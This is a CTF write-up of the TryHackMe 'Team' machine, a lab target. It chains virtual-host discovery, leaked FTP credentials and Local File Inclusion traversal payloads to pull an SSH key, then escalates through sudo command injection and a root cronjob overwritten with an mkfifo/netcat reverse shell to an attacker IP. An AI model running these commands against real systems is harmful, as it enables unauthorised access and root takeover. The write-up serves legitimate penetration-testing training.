# Team - TryHackMe

Linux machine with a web server, FTP and SSH exposed. The path chains two virtual
host discoveries with a Local File Inclusion vulnerability to recover an SSH private
key, then escalates through a sudo command injection and a root-owned writable cronjob.

---

## Reconnaissance

```bash
nmap -sV -sC 10.66.190.235
```

Three open ports:

- FTP (21) - vsftpd
- SSH (22)
- HTTP (80) - Apache

---

## Enumeration

### HTTP - Virtual Host Discovery

The default Apache page has no useful content, but viewing the page source reveals a
domain name. Adding it to `/etc/hosts` loads the actual site:

```bash
echo "10.66.190.235 team.thm" >> /etc/hosts
```

### Web Enumeration

Gobuster against `team.thm` finds `robots.txt`, which leaks the username `dale`, and
a `scripts/` directory (403 forbidden):

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Fuzzing `scripts/` with `.txt` extension finds `script.txt`, which contains a note
referencing `script.old`. Downloading that file directly reveals FTP credentials:

```bash
curl http://team.thm/scripts/script.old
```

```
ftpuser : T3@m$h@r3
```

### FTP

Logging in with the recovered credentials finds `New_site.txt`, which mentions a
`.dev` subdomain and an SSH key:

```bash
ftp 10.66.190.235
# login: ftpuser / T3@m$h@r3
get New_site.txt
```

Adding the subdomain to `/etc/hosts`:

```bash
echo "10.66.190.235 dev.team.thm" >> /etc/hosts
```

### LFI - SSH Key Recovery

The dev site exposes a `page` parameter vulnerable to Local File Inclusion:

```bash
curl "http://dev.team.thm/index.php?page=../../../../etc/passwd"
```

Reading `sshd_config` through the LFI reveals the path to the authorized key file.
The private key itself is readable through the same vulnerability:

```bash
curl "http://dev.team.thm/index.php?page=../../../../etc/ssh/sshd_config"
```

The key content requires cleanup - the LFI output wraps it in comment characters (`#`)
that need to be removed before use.

---

## Initial Access

With the cleaned private key, SSH access as `dale` is straightforward:

```bash
chmod 600 id_rsa
ssh -i id_rsa dale@10.66.190.235
cat /home/dale/user.txt
```

---

## Privilege Escalation

### dale to gyles - sudo Command Injection

```bash
sudo -l
```

`dale` can run `/home/gyles/admin_checks` as `gyles` with NOPASSWD. The script prompts
for a name and a date - the date field is passed directly to `exec()` without
sanitization:

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name: anything
# Enter 'date': /bin/bash
```

This drops a shell as `gyles`. Upgrading it to a proper TTY:

```bash
script -qc /bin/bash /dev/null
```

### gyles to root - Cronjob Hijacking

`gyles` is a member of the `editors` group, which has write access to
`/usr/local/bin/main_backup.sh`. A root cronjob executes this script periodically.

Replacing the script content with a reverse shell:

```bash
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.114.230 4444 >/tmp/f
```

On the attacker machine:

```bash
nc -lvnp 4444
```

After 1-2 minutes the cronjob fires and delivers a root shell.

```bash
cat /root/root.txt
```

---

## Key Takeaways

- LFI against configuration files is a high-value pattern. Reading `sshd_config` to
  locate and then extract SSH keys is a technique that appears in both CTFs and real
  assessments - always test `/etc/ssh/sshd_config` when LFI is confirmed.
- `sudo -l` should be the first command after any shell. Here it immediately revealed
  the lateral movement path to `gyles` with no further enumeration needed.
- A writable file executed by a root cronjob is a guaranteed privilege escalation.
  Checking group memberships and file permissions on scheduled scripts is a standard
  post-exploitation step.
- Complete web enumeration before resorting to brute force. The FTP credentials were
  in `script.old`, not guessable through Hydra - time spent on brute force was wasted.

---

## Disclaimer

This room was completed in the controlled, legal environment provided by TryHackMe.
All actions were performed strictly for educational purposes.
